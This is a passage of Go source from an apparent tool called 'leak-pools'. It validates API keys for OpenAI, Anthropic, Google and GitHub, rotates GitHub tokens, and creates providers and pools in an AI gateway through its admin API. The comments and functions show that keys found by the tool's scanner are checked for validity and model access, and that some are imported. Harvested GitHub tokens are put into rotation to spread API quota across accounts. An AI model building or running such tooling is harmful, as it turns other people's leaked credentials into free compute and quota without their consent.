	lastDash := false
	for _, r := range v {
		ok := (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-' || r == '_'
		if ok {
			b.WriteRune(r)
			lastDash = false
			continue
		}
		if !lastDash {
			b.WriteByte('-')
			lastDash = true
		}
	}
	out := strings.Trim(b.String(), "-_")
	if len(out) > 48 {
		out = out[:48]
		out = strings.Trim(out, "-_")
	}
	return out
}

func sha256Hex(s string) string {
	sum := sha256.Sum256([]byte(s))
	return hex.EncodeToString(sum[:])
}

func keyHash(service, key string) string {
	return sha256Hex("leak-pools|" + strings.ToLower(service) + "|" + key)
}

func maskKey(key string) string {
	if len(key) <= 12 {
		return strings.Repeat("*", len(key))
	}
	return key[:6] + "…" + key[len(key)-4:]
}

func truncate(s string, n int) string {
	s = strings.TrimSpace(s)
	if len(s) <= n {
		return s
	}
	return s[:n] + "…"
}

func mustJSON(v interface{}) string {
	b, err := json.Marshal(v)
	if err != nil {
		return `{"error":"encode failed"}`
	}
	return string(b)
}

func orDash(v string) string {
	if strings.TrimSpace(v) == "" {
		return "—"
	}
	return v
}

func formatTime(t time.Time) string {
	if t.IsZero() {
		return "never"
	}
	return t.UTC().Format("2006-01-02 15:04:05")
}

func serviceByID(id string) serviceDef {
	id = strings.ToLower(strings.TrimSpace(id))
	for _, svc := range serviceDefs {
		if svc.ID == id {
			return svc
		}
	}
	return serviceDef{}
}

func serviceName(id string) string {
	svc := serviceByID(id)
	if svc.Name == "" {
		return id
	}
	return svc.Name
}

func compileKeyPatterns() []compiledPattern {
	out := make([]compiledPattern, 0, len(keyPatternDefs))
	for _, def := range keyPatternDefs {
		out = append(out, compiledPattern{Def: def, RE: regexp.MustCompile(def.Pattern)})
	}
	return out
}

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------

func statePath(dir string) string {
	return filepath.Join(dir, stateFileName)
}

func loadState(dir string) State {
	st := State{Version: 1, CreatedAt: nowUTC()}
	if strings.TrimSpace(dir) == "" {
		return st
	}
	data, err := os.ReadFile(statePath(dir))
	if err != nil {
		return st
	}
	if err := json.Unmarshal(data, &st); err != nil {
		return State{Version: 1, CreatedAt: nowUTC()}
	}
	if st.Version == 0 {
		st.Version = 1
	}
	return st
}

func saveState(dir string, st *State) error {
	if strings.TrimSpace(dir) == "" {
		return fmt.Errorf("state dir is empty")
	}
	st.UpdatedAt = nowUTC()
	if st.CreatedAt.IsZero() {
		st.CreatedAt = st.UpdatedAt
	}
	data, err := json.MarshalIndent(st, "", "  ")
	if err != nil {
		return err
	}
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return err
	}
	tmp := statePath(dir) + ".tmp"
	if err := os.WriteFile(tmp, data, 0o600); err != nil {
		return err
	}
	return os.Rename(tmp, statePath(dir))
}

func trimFindings(in []Finding) []Finding {
	if len(in) <= maxFindings {
		return in
	}
	return append([]Finding(nil), in[len(in)-maxFindings:]...)
}

func trimSeen(in []string) []string {
	if len(in) <= maxSeenEvents {
		return in
	}
	return append([]string(nil), in[len(in)-maxSeenEvents:]...)
}

// markEventSeen records an event id as processed in memory only. The caller
// persists the whole slice at the end of the poll, which lets a budget-limited
// poll leave newer events unmarked and retry them next cycle.
func markEventSeen(st *State, seen map[string]bool, id string) {
	if id == "" || seen[id] {
		return
	}
	seen[id] = true
	st.SeenEvents = append(st.SeenEvents, id)
}

func trimPending(in []PendingKey) []PendingKey {
	if len(in) <= maxPending {
		return in
	}
	return append([]PendingKey(nil), in[len(in)-maxPending:]...)
}

func findingIndex(st *State, hash string) int {
	for i := len(st.Findings) - 1; i >= 0; i-- {
		if st.Findings[i].KeyHash == hash {
			return i
		}
	}
	return -1
}

func managedKeyIndex(st *State, hash string) int {
	for i := range st.Keys {
		if st.Keys[i].KeyHash == hash {
			return i
		}
	}
	return -1
}

func managedPoolIndex(st *State, name string) int {
	for i := range st.Pools {
		if st.Pools[i].Name == name {
			return i
		}
	}
	return -1
}

func pendingIndex(st *State, hash string) int {
	for i := range st.Pending {
		if st.Pending[i].KeyHash == hash {
			return i
		}
	}
	return -1
}

func removeManagedKeyAt(st *State, idx int) {
	if idx < 0 || idx >= len(st.Keys) {
		return
	}
	st.Keys = append(st.Keys[:idx], st.Keys[idx+1:]...)
}

func removeManagedPoolAt(st *State, idx int) {
	if idx < 0 || idx >= len(st.Pools) {
		return
	}
	st.Pools = append(st.Pools[:idx], st.Pools[idx+1:]...)
}

func updateManagedPool(st *State, name, service string, members []string) {
	idx := managedPoolIndex(st, name)
	now := nowUTC()
	if idx < 0 {
		st.Pools = append(st.Pools, ManagedPool{
			Name: name, Service: service, Strategy: "round_robin",
			Members:   append([]string(nil), members...),
			CreatedAt: now, UpdatedAt: now,
		})
		return
	}
	st.Pools[idx].Members = append([]string(nil), members...)
	st.Pools[idx].UpdatedAt = now
	if st.Pools[idx].Service == "" {
		st.Pools[idx].Service = service
	}
}

func poolMembersWithout(st *State, poolName, provider string) []string {
	idx := managedPoolIndex(st, poolName)
	if idx < 0 {
		return nil
	}
	out := make([]string, 0, len(st.Pools[idx].Members))
	for _, m := range st.Pools[idx].Members {
		if m != provider {
			out = append(out, m)
		}
	}
	return out
}

func existingPoolMembers(st *State, poolName string) []string {
	idx := managedPoolIndex(st, poolName)
	if idx < 0 {
		return nil
	}
	return append([]string(nil), st.Pools[idx].Members...)
}

// ---------------------------------------------------------------------------
// HTTP helpers
// ---------------------------------------------------------------------------

type httpResult struct {
	Status int
	Header http.Header
	Body   []byte
	Err    error
}

func doHTTP(method, rawURL string, headers map[string]string, body []byte, timeout time.Duration) httpResult {
	req, err := http.NewRequest(method, rawURL, nil)
	if err != nil {
		return httpResult{Err: err}
	}
	if len(body) > 0 {
		req, err = http.NewRequest(method, rawURL, strings.NewReader(string(body)))
		if err != nil {
			return httpResult{Err: err}
		}
	}
	req.Header.Set("User-Agent", "aurorax-leak-pools/1")
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	if timeout <= 0 {
		timeout = defaultTimeoutSec * time.Second
	}
	client := &http.Client{Timeout: timeout}
	resp, err := client.Do(req)
	if err != nil {
		return httpResult{Err: err}
	}
	defer func() { _ = resp.Body.Close() }()
	data, readErr := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
	if readErr != nil {
		return httpResult{Status: resp.StatusCode, Header: resp.Header, Err: readErr}
	}
	return httpResult{Status: resp.StatusCode, Header: resp.Header, Body: data}
}

func bodyText(res httpResult) string {
	return string(res.Body)
}

func bodyLower(res httpResult) string {
	return strings.ToLower(string(res.Body))
}

func bodyHasAny(body string, needles ...string) bool {
	for _, n := range needles {
		if strings.Contains(body, n) {
			return true
		}
	}
	return false
}

func redactKey(text, key string) string {
	if key == "" {
		return text
	}
	return strings.ReplaceAll(text, key, maskKey(key))
}

// ---------------------------------------------------------------------------
// GitHub token pool
// ---------------------------------------------------------------------------

func githubHeaders(token string) map[string]string {
	h := map[string]string{
		"Accept":               "application/vnd.github+json",
		"X-GitHub-Api-Version": "2022-11-28",
	}
	if strings.TrimSpace(token) != "" {
		h["Authorization"] = "Bearer " + strings.TrimSpace(token)
	}
	return h
}

func githubTokenKind(raw string) string {
	switch {
	case strings.HasPrefix(raw, "ghp_"):
		return "classic PAT"
	case strings.HasPrefix(raw, "github_pat_"):
		return "fine-grained PAT"
	case strings.HasPrefix(raw, "gho_"):
		return "OAuth token"
	case strings.HasPrefix(raw, "ghu_"):
		return "app user token"
	case strings.HasPrefix(raw, "ghs_"):
		return kindAppInstall
	default:
		return "unknown"
	}
}

func validateGitHubToken(cfg config, raw string) (*githubMeta, error) {
	raw = strings.TrimSpace(raw)
	if raw == "" {
		return nil, fmt.Errorf("empty token")
	}
	// Installation access tokens (ghs_) authenticate as an app installation,
	// so GitHub answers /user with 403. Validate them through /rate_limit and
	// group each token separately because the installation id is not exposed.
	if strings.HasPrefix(raw, "ghs_") {
		return validateGitHubInstallationToken(cfg, raw)
	}
	res := doHTTP(http.MethodGet, cfg.GitHubAPI+"/user", githubHeaders(raw), nil, cfg.RequestTimeout)
	if res.Err != nil {
		return nil, res.Err
	}
	if res.Status == http.StatusUnauthorized || res.Status == http.StatusForbidden {
		return nil, fmt.Errorf("GitHub rejected the token (HTTP %d)", res.Status)
	}
	if res.Status < 200 || res.Status >= 300 {
		return nil, fmt.Errorf("GitHub /user returned HTTP %d: %s", res.Status, truncate(bodyText(res), 160))
	}
	var user ghUser
	if err := json.Unmarshal(res.Body, &user); err != nil {
		return nil, fmt.Errorf("invalid /user response: %w", err)
	}
	meta := &githubMeta{
		UserID:    user.ID,
		Login:     user.Login,
		Remaining: 5000,
		Reset:     time.Now().Add(time.Hour).Unix(),
	}
	if scopes := res.Header.Get("X-OAuth-Scopes"); scopes != "" {
		for _, s := range strings.Split(scopes, ",") {
			s = strings.TrimSpace(s)
			if s != "" {
				meta.Scopes = append(meta.Scopes, s)
			}
		}
	}
	rate := doHTTP(http.MethodGet, cfg.GitHubAPI+"/rate_limit", githubHeaders(raw), nil, cfg.RequestTimeout)
	applyRateLimitMeta(meta, rate)
	return meta, nil
}

func validateGitHubInstallationToken(cfg config, raw string) (*githubMeta, error) {
	res := doHTTP(http.MethodGet, cfg.GitHubAPI+"/rate_limit", githubHeaders(raw), nil, cfg.RequestTimeout)
	if res.Err != nil {
		return nil, res.Err
	}
	if res.Status == http.StatusUnauthorized || res.Status == http.StatusForbidden {
		return nil, fmt.Errorf("GitHub rejected the installation token (HTTP %d)", res.Status)
	}
	if res.Status < 200 || res.Status >= 300 {
		return nil, fmt.Errorf("GitHub /rate_limit returned HTTP %d: %s", res.Status, truncate(bodyText(res), 160))
	}
	meta := &githubMeta{
		Login:     "app installation",
		Remaining: 5000,
		Reset:     time.Now().Add(time.Hour).Unix(),
	}
	applyRateLimitMeta(meta, res)
	return meta, nil
}

func applyRateLimitMeta(meta *githubMeta, res httpResult) {
	if meta == nil || res.Status < 200 || res.Status >= 300 {
		return
	}
	var rl ghRateLimit
	if json.Unmarshal(res.Body, &rl) != nil || rl.Resources.Core.Reset == 0 {
		return
	}
	meta.Remaining = rl.Resources.Core.Remaining
	meta.Reset = rl.Resources.Core.Reset
}

func addGitHubTokenToState(st *State, raw string, meta *githubMeta, source string) bool {
	raw = strings.TrimSpace(raw)
	if raw == "" || meta == nil {
		return false
	}
	kind := githubTokenKind(raw)
	initialStatus := "active"
	if kind == kindAppInstall {
		// Installation tokens authenticate an app, not a user, so the user
		// events feed is not available to them. Keep the token visible but
		// out of the scanner rotation.
		initialStatus = "unsupported"
	}
	hash := sha256Hex(raw)
	for i := range st.GitHubTokens {
		t := &st.GitHubTokens[i]
		if t.Hash != hash {
			continue
		}
		// Refresh quota metadata for an already-known token.
		t.Remaining = meta.Remaining
		t.Reset = meta.Reset
		t.LastError = ""
		if t.Status == "" || t.Status == "revoked" {
			t.Status = initialStatus
		}
		// A token explicitly pasted in the settings is settings-owned from
		// now on; harvesting must not downgrade that ownership or deleting
		// the setting would leave the token behind.
		if source == tokenSourceHarvest {
			if t.Source == "" {
				t.Source = source
			}
		} else if source != "" {
			t.Source = source
		}
		return false
	}
	if len(st.GitHubTokens) >= maxGitHubTokens {
		return false
	}
	st.GitHubTokens = append(st.GitHubTokens, GitHubToken{
		Token:     raw,
		Hash:      hash,
		Kind:      kind,
		Source:    source,
		UserID:    meta.UserID,
		Login:     meta.Login,
		Scopes:    append([]string(nil), meta.Scopes...),
		Remaining: meta.Remaining,
		Reset:     meta.Reset,
		Status:    initialStatus,
	})
	return true
}

type configuredGitHubToken struct {
	raw    string
	source string
}

// configuredGitHubTokens lists the tokens the operator supplied through the
// settings and the environment. These are authoritative: the state file must
// not keep a copy after the setting is cleared.
func configuredGitHubTokens(cfg config) []configuredGitHubToken {
	var out []configuredGitHubToken
	seen := make(map[string]bool)
	add := func(raw, source string) {
		raw = strings.TrimSpace(raw)
		if raw == "" {
			return
		}
		hash := sha256Hex(raw)
		if seen[hash] {
			return
		}
		seen[hash] = true
		out = append(out, configuredGitHubToken{raw: raw, source: source})
	}
	for _, raw := range splitList(cfg.GitHubToken) {
		add(raw, tokenSourceSetting)
	}
	for _, raw := range splitList(cfg.GitHubTokens) {
		add(raw, tokenSourceSetting)
	}
	add(envValue("GITHUB_TOKEN"), tokenSourceEnv)
	add(envValue("GH_TOKEN"), tokenSourceEnv)
	return out
}

func configuredGitHubTokenSources(cfg config) map[string]string {
	tokens := configuredGitHubTokens(cfg)
	out := make(map[string]string, len(tokens))
	for _, t := range tokens {
		out[sha256Hex(t.raw)] = t.source
	}
	return out
}

func removeGitHubTokenAt(st *State, idx int) {
	if idx < 0 || idx >= len(st.GitHubTokens) {
		return
	}
	st.GitHubTokens = append(st.GitHubTokens[:idx], st.GitHubTokens[idx+1:]...)
}

// harvestedTokenEvidence reports whether a token in the state is also present
// in the findings, i.e. it was discovered by the scanner rather than pasted
// into the settings. Old state entries have no source, so migration uses this
// to avoid deleting harvested tokens.
func harvestedTokenEvidence(st *State, hash string) bool {
	for i := range st.Findings {
		if st.Findings[i].Service == "github" && st.Findings[i].KeyHash == hash {
			return true
		}
	}
	return false
}

// reconcileGitHubTokenSettings removes tokens that belong to a setting or an
// environment variable but are no longer present there, classifies legacy
// entries, and applies the one-shot forget switch. It performs no network
// calls, so it can run even when scanning is disabled.
func reconcileGitHubTokenSettings(st *State, cfg config) bool {
	if !cfg.StoreLoaded {
		return false
	}
	changed := false
	configured := configuredGitHubTokenSources(cfg)

	for i := range st.GitHubTokens {
		t := &st.GitHubTokens[i]
		if t.Source != "" {
			continue
		}
		switch {
		case configured[t.Hash] != "":
			t.Source = configured[t.Hash]
		case harvestedTokenEvidence(st, t.Hash):
			t.Source = tokenSourceHarvest
		default:
			t.Source = tokenSourceLegacy
		}
		changed = true
	}

	if st.Version < 2 {
		// v1 kept every token forever. Drop the leftovers that neither the
		// settings nor a harvest finding can account for; this is how a token
		// pasted in an old version finally disappears.
		for i := len(st.GitHubTokens) - 1; i >= 0; i-- {
			if st.GitHubTokens[i].Source != tokenSourceLegacy {
				continue
			}
			removeGitHubTokenAt(st, i)
			changed = true
		}
		st.Version = 2
		changed = true
	}

	for i := len(st.GitHubTokens) - 1; i >= 0; i-- {
		t := st.GitHubTokens[i]
		if t.Source != tokenSourceSetting && t.Source != tokenSourceEnv {
			continue
		}
		if _, ok := configured[t.Hash]; ok {
			continue
		}
		removeGitHubTokenAt(st, i)
		changed = true
	}

	if !cfg.ForgetSavedTokens {
		if st.ForgetHandled {
			st.ForgetHandled = false
			changed = true
		}
		return changed
	}
	if st.ForgetHandled {
		return changed
	}
	for i := len(st.GitHubTokens) - 1; i >= 0; i-- {
		if _, ok := configured[st.GitHubTokens[i].Hash]; ok {
			continue
		}
		removeGitHubTokenAt(st, i)
		changed = true
	}
	st.ForgetHandled = true
	return true
}

func addBootstrapGitHubTokens(st *State, cfg config) {
	reconcileGitHubTokenSettings(st, cfg)
	for _, tok := range configuredGitHubTokens(cfg) {
		hash := sha256Hex(tok.raw)
		known := false
		for i := range st.GitHubTokens {
			if st.GitHubTokens[i].Hash == hash {
				known = true
				break
			}
		}
		if known {
			continue
		}
		meta, err := validateGitHubToken(cfg, tok.raw)
		if err != nil {
			st.LastError = "GitHub token: " + redactKey(err.Error(), tok.raw)
			st.Counters.Errors++
			continue
		}
		addGitHubTokenToState(st, tok.raw, meta, tok.source)
	}
}

func reviveGitHubTokens(st *State) {
	now := time.Now().Unix()
	for i := range st.GitHubTokens {
		t := &st.GitHubTokens[i]
		if t.Status == "exhausted" && now >= t.Reset {
			t.Status = "active"
			t.Remaining = 5000
		}
		if t.Status == "quarantined" && now >= t.RetryAfter {
			t.Status = "active"
		}
		if t.Status == "denied" && now >= t.RetryAfter {
			t.Status = "active"
		}
	}
}

func githubGroupKey(t *GitHubToken) string {
	if t.UserID == 0 {
		return "token:" + t.Hash
	}
	return strconv.FormatInt(t.UserID, 10)
}

// githubGroupRemaining groups tokens by GitHub account. Tokens belonging to
// one account share a single hourly budget, so the group's remaining quota is
// the highest value reported by its tokens — summing them would multiply the
// same budget by the number of tokens.
func githubGroupRemaining(st *State) map[string]int {
	groups := make(map[string]int)
	for i := range st.GitHubTokens {
		t := &st.GitHubTokens[i]
		if t.Status != "active" || t.Remaining <= 0 {
			continue
		}
		group := githubGroupKey(t)
		if cur, ok := groups[group]; !ok || t.Remaining > cur {
			groups[group] = t.Remaining
		}
	}
	return groups
}

func pickGitHubToken(st *State, cfg config) int {
	reviveGitHubTokens(st)
	now := time.Now()
	groups := githubGroupRemaining(st)
	best := -1
	bestGroupRemaining := -1
	for i := range st.GitHubTokens {
		t := &st.GitHubTokens[i]
		if t.Status != "active" || t.Remaining <= 0 {
			continue
		}
		gr := groups[githubGroupKey(t)]
		if gr < bestGroupRemaining {
			continue
		}
		if best < 0 || gr > bestGroupRemaining {
			best = i
			bestGroupRemaining = gr
			continue
		}
		cur := &st.GitHubTokens[best]
		if t.Remaining > cur.Remaining ||
			(t.Remaining == cur.Remaining && t.LastUsed.Before(cur.LastUsed)) {
			best = i
		}
	}
	if best >= 0 {
		st.GitHubTokens[best].Remaining--
		st.GitHubTokens[best].LastUsed = now
	}
	return best
}

func reportGitHubToken(st *State, idx int, res httpResult) {
	if idx < 0 || idx >= len(st.GitHubTokens) {
		return
	}
	t := &st.GitHubTokens[idx]
	t.TotalRequests++
	if res.Header != nil {
		if v := res.Header.Get("X-RateLimit-Remaining"); v != "" {
			if n, err := strconv.Atoi(v); err == nil {
				t.Remaining = n
			}
		}
		if v := res.Header.Get("X-RateLimit-Reset"); v != "" {
			if n, err := strconv.ParseInt(v, 10, 64); err == nil {
				t.Reset = n
			}
		}
	}
	body := bodyLower(res)
	switch {
	case res.Status == http.StatusUnauthorized:
		t.Status = "revoked"
		t.TotalErrors++
		t.LastError = "HTTP 401: token revoked or invalid"
	case res.Status == http.StatusTooManyRequests:
		t.Status = "quarantined"
		t.TotalErrors++
		t.RetryAfter = time.Now().Add(retryAfter(res)).Unix()
		t.LastError = "secondary rate limit"
	case res.Status == http.StatusForbidden && bodyHasAny(body, "secondary rate limit", "abuse detection"):
		t.Status = "quarantined"
		t.TotalErrors++
		t.RetryAfter = time.Now().Add(retryAfter(res)).Unix()
		t.LastError = "secondary rate limit"
	case res.Status == http.StatusForbidden && bodyHasAny(body, "rate limit exceeded", "api rate limit"):
		t.Status = "exhausted"
		t.TotalErrors++
		t.LastError = "hourly quota exhausted"
	case res.Status == http.StatusForbidden:
		t.Status = "denied"
		t.TotalErrors++
		t.RetryAfter = time.Now().Add(6 * time.Hour).Unix()
		t.LastError = "HTTP 403: access denied"
	case res.Status >= 400:
		t.TotalErrors++
		t.LastError = fmt.Sprintf("HTTP %d", res.Status)
	case res.Status == http.StatusNotModified:
		t.Status = "active"
		t.LastError = ""
	case res.Status < 400:
		t.Status = "active"
		t.LastError = ""
	}
}

func retryAfter(res httpResult) time.Duration {
	if res.Header != nil {
		if v := res.Header.Get("Retry-After"); v != "" {
			if n, err := strconv.Atoi(v); err == nil && n > 0 {
				return time.Duration(n) * time.Second
			}
		}
	}
	return 60 * time.Second
}

func activeGitHubStats(st *State) (tokens, active, accounts, remaining int) {
	reviveGitHubTokens(st)
	groups := githubGroupRemaining(st)
	for i := range st.GitHubTokens {
		t := &st.GitHubTokens[i]
		tokens++
		if t.Status == "active" {
			active++
		}
	}
	for _, v := range groups {
		remaining += v
	}
	return tokens, active, len(groups), remaining
}

// ---------------------------------------------------------------------------
// Key validation
// ---------------------------------------------------------------------------

func anthropicOAuthKey(key string) bool {
	return strings.HasPrefix(key, "sk-ant-oat01-")
}

func validationHeaders(cfg config, svc serviceDef, key string) map[string]string {
	h := map[string]string{"Accept": "application/json"}
	switch svc.Auth {
	case "anthropic":
		// API keys use x-api-key; OAuth access tokens use Bearer plus the
		// oauth beta flag. Sending an OAuth token as x-api-key always fails.
		if anthropicOAuthKey(key) {
			h["Authorization"] = "Bearer " + key
			h["anthropic-beta"] = "oauth-2025-04-20"
		} else {
			h["x-api-key"] = key
		}
		h["anthropic-version"] = "2023-06-01"
	case "google":
		h["x-goog-api-key"] = key
	default:
		h["Authorization"] = "Bearer " + key
	}
	return h
}

func validateKey(cfg config, svc serviceDef, key string) validationResult {
	if svc.ID == "github" {
		meta, err := validateGitHubToken(cfg, key)
		if err != nil {
			return validationResult{Status: "invalid", Error: truncate(err.Error(), maxBodySnippet)}
		}
		_ = meta
		return validationResult{Status: "valid"}
	}
	if svc.ValidateURL == "" {
		return validationResult{Status: "error", Error: "no validation endpoint"}
	}
	headers := validationHeaders(cfg, svc, key)
	target := svc.ValidateURL
	adminKey := svc.ID == "openai" && strings.HasPrefix(key, "sk-admin-")
	if adminKey {
		// Organization admin keys use a different read endpoint and do not
		// expose model inference, so they are reported but never imported.
		target = strings.TrimRight(svc.BaseURL, "/") + "/organization/admin_api_keys"
	}
	if svc.Auth == "google" {
		target = target + "?key=" + url.QueryEscape(key)
	}
	res := doHTTP(http.MethodGet, target, headers, nil, cfg.RequestTimeout)
	if res.Err != nil {
		return validationResult{Status: "error", Error: truncate(res.Err.Error(), maxBodySnippet)}
	}
	body := bodyLower(res)
	switch {
	case res.Status >= 200 && res.Status < 300:
		out := validationResult{Status: "valid"}
		if svc.Importable && !adminKey && svc.ModelsURL != "" {
			out.Models = fetchModels(cfg, svc, key)
		}
		return out
	case res.Status == http.StatusUnauthorized:
		return validationResult{Status: "invalid", Error: "HTTP 401: invalid or revoked key"}
	case res.Status == http.StatusTooManyRequests:
		return validationResult{Status: "limited", Error: "HTTP 429: rate limited"}
	case res.Status == http.StatusForbidden:
		if bodyHasAny(body, "rate limit", "quota", "exceeded", "too many") {
			return validationResult{Status: "limited", Error: "HTTP 403: quota/rate limit"}
		}
		return validationResult{Status: "invalid", Error: "HTTP 403: key rejected"}
	case res.Status == http.StatusBadRequest:
		if bodyHasAny(body, "api key not valid", "api_key_invalid", "invalid api key", "incorrect api key", "invalid_api_key", "unauthorized") {
			return validationResult{Status: "invalid", Error: "HTTP 400: invalid API key"}
		}
		return validationResult{Status: "error", Error: "HTTP 400: " + truncate(redactKey(bodyText(res), key), 160)}
	case res.Status >= 500:
		return validationResult{Status: "error", Error: fmt.Sprintf("HTTP %d: provider error", res.Status)}
	default:
		return validationResult{Status: "error", Error: fmt.Sprintf("HTTP %d: %s", res.Status, truncate(redactKey(bodyText(res), key), 160))}
	}
}

func fetchModels(cfg config, svc serviceDef, key string) []string {
	if svc.ModelsURL == "" {
		return nil
	}
	headers := validationHeaders(cfg, svc, key)
	target := svc.ModelsURL
	if svc.Auth == "google" {
		target = target + "?key=" + url.QueryEscape(key)
	}
	res := doHTTP(http.MethodGet, target, headers, nil, cfg.RequestTimeout)
	if res.Err != nil || res.Status < 200 || res.Status >= 300 {
		return nil
	}
	switch svc.ModelsMode {
	case "google":
		return parseGoogleModels(res.Body)
	default:
		return parseOpenAIModels(res.Body)
	}
}

func parseOpenAIModels(body []byte) []string {
	var payload struct {
		Data []struct {
			ID string `json:"id"`
		} `json:"data"`
	}
	if err := json.Unmarshal(body, &payload); err != nil {
		return nil
	}
	seen := make(map[string]bool)
	out := make([]string, 0, len(payload.Data))
	for _, m := range payload.Data {
		id := strings.TrimSpace(m.ID)
		if id == "" || seen[id] {
			continue
		}
		seen[id] = true
		out = append(out, id)
	}
	sort.Strings(out)
	if len(out) > maxModels {
		out = out[:maxModels]
	}
	return out
}

func parseGoogleModels(body []byte) []string {
	var payload struct {
		Models []struct {
			Name string `json:"name"`
			ID   string `json:"id"`
		} `json:"models"`
	}
	if err := json.Unmarshal(body, &payload); err != nil {
		return nil
	}
	seen := make(map[string]bool)
	out := make([]string, 0, len(payload.Models))
	for _, m := range payload.Models {
		id := strings.TrimSpace(m.ID)
		if id == "" {
			id = strings.TrimSpace(m.Name)
			id = strings.TrimPrefix(id, "models/")
		}
		if id == "" || seen[id] {
			continue
		}
		seen[id] = true
		out = append(out, id)
	}
	sort.Strings(out)
	if len(out) > maxModels {
		out = out[:maxModels]
	}
	return out
}

// ---------------------------------------------------------------------------
// Admin API
// ---------------------------------------------------------------------------

type adminClient struct {
	base    string
	key     string
	timeout time.Duration
}

func newAdminClient(cfg config) *adminClient {
	return &adminClient{base: strings.TrimRight(cfg.AdminURL, "/"), key: cfg.AdminKey, timeout: cfg.RequestTimeout}
}

func (c *adminClient) request(method, path string, body interface{}) (int, []byte, error) {
	if strings.TrimSpace(c.base) == "" {
		return 0, nil, fmt.Errorf("admin URL is empty")
	}
	var payload []byte
	if body != nil {
		var err error
		payload, err = json.Marshal(body)
		if err != nil {
			return 0, nil, err
		}
	}
	headers := map[string]string{"Accept": "application/json", "Content-Type": "application/json"}
	if strings.TrimSpace(c.key) != "" {
		headers["Authorization"] = "Bearer " + strings.TrimSpace(c.key)
	}
	res := doHTTP(method, c.base+path, headers, payload, c.timeout)
	if res.Err != nil {
		return 0, nil, res.Err
	}
	if res.Status < 200 || res.Status >= 300 {
		msg := truncate(string(res.Body), maxBodySnippet)
		if res.Status == http.StatusUnauthorized || res.Status == http.StatusForbidden {
			msg = "admin API rejected the key (set admin_key or AURORA_MASTER_KEY)"
		}
		return res.Status, res.Body, fmt.Errorf("admin API %s %s: HTTP %d: %s", method, path, res.Status, msg)
	}
	return res.Status, res.Body, nil
}

func (c *adminClient) providers() (map[string]string, error) {
	_, body, err := c.request(http.MethodGet, "/admin/api/v1/pools/options", nil)
	if err != nil {
		return nil, err
	}
	var resp adminProvidersResp
	if err := json.Unmarshal(body, &resp); err != nil {
		return nil, err
	}
	out := make(map[string]string, len(resp.Providers))
	for _, p := range resp.Providers {
		out[p.Name] = strings.ToLower(strings.TrimSpace(p.Type))
	}
	return out, nil
}

// overrideProviders lists every provider override, including disabled ones.
// Older gateways without the endpoint return an error; callers treat that as
// "no extra names" and keep working.
func (c *adminClient) overrideProviders() (map[string]string, error) {
	_, body, err := c.request(http.MethodGet, "/admin/api/v1/providers/overrides", nil)
	if err != nil {
		return nil, err
	}
	var resp []adminProvider
	if err := json.Unmarshal(body, &resp); err != nil {
		return nil, err
	}
	out := make(map[string]string, len(resp))
	for _, p := range resp {
		if strings.TrimSpace(p.Name) == "" {
			continue
		}
		out[p.Name] = strings.ToLower(strings.TrimSpace(p.Type))
	}
	return out, nil
}

func (c *adminClient) pools() (map[string]bool, error) {
	_, body, err := c.request(http.MethodGet, "/admin/api/v1/pools", nil)
	if err != nil {
		return nil, err
	}
	var resp adminPoolsResp
	if err := json.Unmarshal(body, &resp); err != nil {
		return nil, err
	}
	out := make(map[string]bool, len(resp.Pools))
	for _, p := range resp.Pools {
		out[p.Name] = true
	}
	return out, nil
}

func (c *adminClient) createProvider(p providerPayload) error {
	_, _, err := c.request(http.MethodPost, "/admin/api/v1/providers", p)
	return err
}

func (c *adminClient) updateProvider(name string, patch providerPatch) error {
	_, _, err := c.request(http.MethodPut, "/admin/api/v1/providers/"+url.PathEscape(name), patch)
	return err
}

func (c *adminClient) deleteProvider(name string) error {
	_, _, err := c.request(http.MethodDelete, "/admin/api/v1/providers/"+url.PathEscape(name), nil)
	return err
}

func (c *adminClient) createPool(p poolPayload) error {
	_, _, err := c.request(http.MethodPost, "/admin/api/v1/pools", p)
	return err
}

func (c *adminClient) updatePool(name string, p poolPayload) error {
	p.Name = name
	_, _, err := c.request(http.MethodPut, "/admin/api/v1/pools/"+url.PathEscape(name), p)
	return err
}

func (c *adminClient) deletePool(name string) error {
	_, _, err := c.request(http.MethodDelete, "/admin/api/v1/pools/"+url.PathEscape(name), nil)
	return err
}

func getInventory(cfg config, force bool) (adminInventory, error) {
	base := strings.TrimRight(cfg.AdminURL, "/")
	invMu.Lock()
	if !force && invBase == base && !invCache.At.IsZero() && time.Since(invCache.At) < 30*time.Second {
		out := copyInventory(invCache)
		invMu.Unlock()
		return out, nil
	}
	invMu.Unlock()

	client := newAdminClient(cfg)
	providers, err := client.providers()
	if err != nil {
		return adminInventory{}, err
	}
	pools, err := client.pools()
	if err != nil {
		return adminInventory{}, err
	}
	allProviders := make(map[string]string, len(providers))
	for k, v := range providers {
		allProviders[k] = v
	}
	// Disabled overrides are missing from /pools/options, but their names are
	// still taken. The endpoint is best-effort so older gateways keep working.
	if overrides, oerr := client.overrideProviders(); oerr == nil {
		for k, v := range overrides {
			if _, ok := allProviders[k]; !ok {
				allProviders[k] = v
			}
		}
	}
	inv := adminInventory{Providers: providers, Pools: pools, AllProviders: allProviders, At: nowUTC()}

	invMu.Lock()
	invCache = inv
	invBase = base
	invMu.Unlock()
	return copyInventory(inv), nil
}

func copyInventory(inv adminInventory) adminInventory {
	out := adminInventory{
		Providers:    make(map[string]string, len(inv.Providers)),
		Pools:        make(map[string]bool, len(inv.Pools)),
		AllProviders: make(map[string]string, len(inv.AllProviders)),
		At:           inv.At,
	}
	for k, v := range inv.Providers {
		out.Providers[k] = v
	}
	for k, v := range inv.Pools {
		out.Pools[k] = v
	}
	for k, v := range inv.AllProviders {
		out.AllProviders[k] = v
	}
	return out
}

// providerNameTaken reports whether any provider — including a disabled
// override — already uses this name. The gateway rejects a duplicate on
// create, and a pool cannot share a name with a provider either.
func providerNameTaken(inv adminInventory, name string) bool {
	if _, ok := inv.AllProviders[name]; ok {
		return true
	}
	_, ok := inv.Providers[name]
	return ok
}

func invalidateInventory() {
	invMu.Lock()
	invCache = adminInventory{}
	invBase = ""
	invMu.Unlock()
}

func testAdmin(cfg config) string {
	client := newAdminClient(cfg)
	_, _, err := client.request(http.MethodGet, "/admin/api/v1/pools/options", nil)
	if err == nil {
		return "reachable"
	}
	msg := strings.ToLower(err.Error())
	if strings.Contains(msg, "rejected the key") {
		return "unauthorized"
	}
	return "unreachable: " + truncate(err.Error(), 120)
}

